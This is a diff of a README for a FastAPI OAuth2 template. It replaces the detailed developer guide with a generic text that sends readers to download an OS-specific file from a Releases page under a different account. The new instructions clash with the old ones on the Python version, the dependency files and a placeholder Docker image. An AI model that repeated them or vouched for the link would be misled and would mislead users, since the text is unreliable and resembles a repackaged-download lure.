@@ -1,343 +1,87 @@
-# 🧱 Barebone FastAPI OAuth2
-
-[![Use this template](https://img.shields.io/badge/GitHub-Use%20this%20template-success?style=for-the-badge&logo=github)](https://github.com/alessiocsassu/fastapi-oauth-barebone/generate)
-[![Latest Release](https://img.shields.io/github/v/release/alessiocsassu/fastapi-oauth-barebone?style=for-the-badge&logo=github)](https://github.com/alessiocsassu/fastapi-oauth-barebone/releases)
-[![License](https://img.shields.io/github/license/alessiocsassu/fastapi-oauth-barebone?style=for-the-badge)](./LICENSE)
-
-
-## ⚙️ Key Technologies
-
-| Component | Technology |
-|-----------|-------------|
-| **Language** | Python 3.12+ |
-| **API Framework** | FastAPI |
-| **Server** | Uvicorn (ASGI) |
-| **Database** | PostgreSQL |
-| **ORM** | SQLAlchemy |
-| **Migrations** | Alembic |
-| **Data Validation** | Pydantic |
-| **Authentication** | JWT (JSON Web Token) |
-
----
-
-## 🧰 Tooling & DevOps
-
-| Area | Tool |
-|-------|--------|
-| **Development Environment** | Docker + Docker Compose |
-| **Testing** | Pytest |
-| **DB Migrations** | Alembic |
-| **Security** | JWT + bcrypt |
-| **Environment Management** | .env |
-
----
-
-## 🗂️ Project Structure
-
-```text
-fastapi-oauth-base/
-│
-├── alembic
-│   ├── versions
-│   ├── env.py
-│   └── script.py.mako
-├── app
-│   ├── api
-│   │   ├── routes
-│   │   │   ├── __init__.py
-│   │   │   └── users.py
-│   │   └── __init__.py
-│   ├── auth
-│   │   ├── api
-│   │   │   ├── routes
-│   │   │   │   ├── __init__.py
-│   │   │   │   └── auth.py
-│   │   │   └── __init__.py
-│   │   ├── core
-│   │   │   ├── __init__.py
-│   │   │   └── security.py
-│   │   ├── managers
-│   │   │   ├── __init__.py
-│   │   │   └── auth_manager.py
-│   │   ├── schemas
-│   │   │   └── auth_schema.py
-│   │   ├── services
-│   │   │   ├── __init__.py
-│   │   │   └── auth_service.py
-│   │   └── __init__.py
-│   ├── config
-│   │   ├── __init__.py
-│   │   └── config.py
-│   ├── db
-│   │   ├── models
-│   │   │   ├── __init__.py
-│   │   │   ├── base.py
-│   │   │   └── user.py
-│   │   ├── __init__.py
-│   │   └── session.py
-│   ├── managers
-│   │   ├── __init__.py
-│   │   ├── base_manager.py
-│   │   └── user_manager.py
-│   ├── schemas
-│   │   ├── __init__.py
-│   │   ├── base.py
-│   │   └── user.py
-│   ├── services
-│   │   ├── __init__.py
-│   │   ├── base_service.py
-│   │   └── user_service.py
-│   ├── __init__.py
-│   ├── main.py
-│   └── pytest.ini
-├── tests
-│   ├── __pycache__
-│   ├── __init__.py
-│   └── test_users.py
-├── CHANGELOG.md
-├── Dockerfile
-├── README.md
-├── __init__.py
-├── alembic.ini
-├── docker-compose.yml
-└── pyproject.toml
-```
----
-
-## 🚀 Setup Commands
-
-Launch the './build.sh' command or follow the steps:
-
-1. Verify if the directory alembic/version exist and if not create it
-
-2. Create and activate the virtual environment
-
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
-3. Select the Python version from the virtual environment (in your IDE)
-
-4. Install and update poetry
-
-```bash
-pip install poetry
-poetry install --no-root
-```
-
-5. Create the `.env` file
-
-```bash
-cp .env.example .env
-```
-
-6. Build and start services with docker
-```bash
-docker compose up --build -d
-```
-
-7. Run alembic migrations inside the container
-```bash
-docker exec -it app alembic revision --autogenerate -m "init schema"
-docker exec -it app alembic upgrade head
-```
-
-8. Run automated tests (opzionale)
-```bash
-docker exec -it test pytest tests/
-```
-
----
-
-## 📌 Guide on how to create Model, Schema, Service, Manager and Endpoints
-
-This project uses a modular architecture based on reusable **base classes** (`BaseService`, `BaseManager`, `BaseSchema`, `Base`) designed to avoid repeating the same logic in every new module.
-
-Thanks to these base classes, adding a new entity (e.g., `Product`, `Article`, `Category`, etc.) becomes fast and consistent.
-
-Below is a step-by-step guide for anyone who clones this repository.
-
----
-
-### 🧱 1. Create a New Model (SQLAlchemy)
-
-All models inherit from the `Base` class:
-
-```python
-from sqlalchemy.orm import DeclarativeBase
-
-class Base(DeclarativeBase):
-    pass
-```
-
-To create a new model, add a file inside:
-
-```bash
-app/db/models/
-```
-
-Example: `Product` model
-
-```python
-from sqlalchemy.orm import Mapped, mapped_column
-from app.db.models.base import Base
-
-class Product(Base):
-    __tablename__ = "products"
-
-    id: Mapped[int] = mapped_column(primary_key=True)
-    name: Mapped[str]
-    code: Mapped[str]
-```
-
-After creating the model generate and apply migrations:
-
-```bash
-alembic revision --autogenerate -m "add product"
-alembic upgrade head
-```
-
-### 📄 2. Create the Pydantic Schemas
-
-Schemas define the request/response structure of your API.
-
-Create a file inside:
-
-```bash
-app/schemas/product.py
-```
-
-Example:
-
-```python
-from pydantic import BaseModel
-
-class ProductCreate(BaseModel):
-    name: str
-    code: str
-
-class ProductRead(BaseModel):
-    id: int
-    name: str
-    code: str
-```
-
-### ⚙️ 3. Create the Service (CRUD Layer)
-
-Services handle database operations only.
-They inherit from BaseService, so you don’t need to rewrite CRUD logic.
-
-Create:
-
-```bash
-app/services/product_service.py
-```
-
-Example:
-
-```python
-from typing import Optional
-from sqlalchemy.ext.asyncio import AsyncSession
-from sqlalchemy import select
-from app.db.models.product import Product
-from app.services.base_service import BaseService
-
-class ProductService(BaseService[Product]):
-    model = Product
-
-    @staticmethod
-    async def get_by_code(db: AsyncSession, code: str) -> Optional[Product]:
-        result = await db.execute(
-            select(Product).where(Product.code == code)
-        )
-        return result.scalar_one_or_none()
-```
-
-#### Why BaseService exists?
-
-It provides generic methods such as:
-
-- `get_list()`
-- `get_by_id()`
-- `create()`
-- `update()`
-- `delete()`
-
-This keeps your code DRY and consistent across the project.
-
-### 🧠 4. Create the Manager (Business Logic Layer)
-
-Managers sit above Services and handle:
-
-- validation
-- error handling
-- workflows
-- business rules
-- orchestration
-
-Create:
-
-```bash
-app/managers/product_manager.py
-```
-
-Example:
-
-```python
-from app.managers.base_manager import BaseManager
-from app.services.product_service import ProductService
-from app.db.models.product import Product
-
-class ProductManager(BaseManager[Product, ProductService]):
-    service = ProductService
-```
-
-#### Why BaseManager exists?
-
-It provides:
-
-- `get_or_404()`
-- `get_all()`
-- `create()` with safe error handling
-- `update()` with existence checks
-- `delete()` returning a standardized `BaseDelete` schema
-
-This ensures a consistent behavior across all endpoints.
-
-### 🚀 5. Create Routes (API Endpoints)
-
-Create a route file:
-
-```bash
-app/api/routes/product.py
-```
-
-Example:
-
-```python
-from fastapi import APIRouter, Depends
-from sqlalchemy.ext.asyncio import AsyncSession
-from app.managers.product_manager import ProductManager
-from app.schemas.product import ProductCreate, ProductRead
-from app.db.session import get_db
-
-router = APIRouter(prefix="/products", tags=["Products"])
-
-@router.get("/", response_model=list[ProductRead])
-async def list_products(db: AsyncSession = Depends(get_db)):
-    return await ProductManager.get_all(db)
-
-@router.post("/", response_model=ProductRead)
-async def create_product(
-    payload: ProductCreate,
-    db: AsyncSession = Depends(get_db),
-):
-    return await ProductManager.create(db, payload.model_dump())
-```
-
-Finally, register the router inside:
-
-```bash
-app/main.py
-```
----
+# 🚀 fastapi-oauth-barebone - Simple OAuth2 Solution for Everyone
+
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Iskander2012/fastapi-oauth-barebone/releases)
+
+## 📖 Introduction
+Welcome to the **fastapi-oauth-barebone** project! This application provides a foundational template for using OAuth2 with FastAPI. It's geared toward people who want to learn about user authentication and API security without being overwhelmed by complexity. 
+
+This template includes features such as password hashing, token management using JWT, and integration with SQLAlchemy for database operations. With this project, you can easily set up a secure API that can authenticate users and manage their sessions.
+
+## 🚀 Getting Started
+Here’s how to get started with the **fastapi-oauth-barebone** application.
+
+### 1. System Requirements
+Before downloading, ensure your system meets these requirements:
+- Operating System: Windows, macOS, or Linux
+- Docker: Must be installed if you want to run it using Docker
+- Python: Version 3.7 or higher if you plan to run it directly
+
+### 2. Visit the Releases Page
+To download the latest version of the software, [visit the Releases page](https://github.com/Iskander2012/fastapi-oauth-barebone/releases). 
+
+## 📥 Download & Install
+1. Click the link above.
+2. On the Releases page, find the latest version of the software.
+3. Look for the appropriate file for your operating system. 
+4. Click the download button next to the file to start downloading it.
+
+Make sure to save the file in an easily accessible location on your computer.
+
+## 🛠️ Running the Application
+Once you have downloaded the application, follow these steps to run it.
+
+### For Docker Users
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you saved the application.
+3. Use the following command to run the application:
+   ```bash
+   docker run -d -p 8000:8000 your-docker-image-name
+   ```
+4. Open your web browser and go to `http://localhost:8000`.
+
+### For Non-Docker Users
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you saved the application.
+3. Create a virtual environment (optional but recommended):
+   ```bash
+   python -m venv venv
+   ```
+4. Activate the virtual environment:
+   - **Windows**: `venv\Scripts\activate`
+   - **macOS/Linux**: `source venv/bin/activate`
+5. Install the required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
+6. Run the application:
+   ```bash
+   uvicorn app.main:app --host 0.0.0.0 --port 8000
+   ```
+7. Open your web browser and visit `http://localhost:8000`.
+
+## 🔍 Features
+- **OAuth2 Authentication**: Securely log in and authenticate users with passwords.
+- **Token Management**: Issue and validate JWT tokens for user sessions.
+- **SQLAlchemy Integration**: Manage your database effortlessly using SQLAlchemy.
+- **Password Hashing**: Securely store user passwords to enhance security.
+
+## 📄 Documentation
+The project comes with a straightforward API documentation built-in. You can access the documentation by visiting `http://localhost:8000/docs` after running the application. This will help you understand how to use the various features available.
+
+## 🛠️ Troubleshooting
+If you run into issues, try the following:
+- Ensure you have all system requirements met.
+- Double-check that your commands are correct.
+- Consult the community or open an issue on the GitHub repository.
+
+## 📝 Contribution
+If you are interested in contributing to the project, feel free to fork the repository and submit a pull request. Your contributions can help improve this template for everyone.
+
+## 📞 Support
+If you need help, please check the issues tab on the GitHub repository. You may find solutions to common problems. If not, feel free to open a new issue.
+
+## 🌐 Links
+- [Visit the Releases page to download](https://github.com/Iskander2012/fastapi-oauth-barebone/releases)
+- [Documentation](http://localhost:8000/docs)
+
+Thank you for using **fastapi-oauth-barebone**!
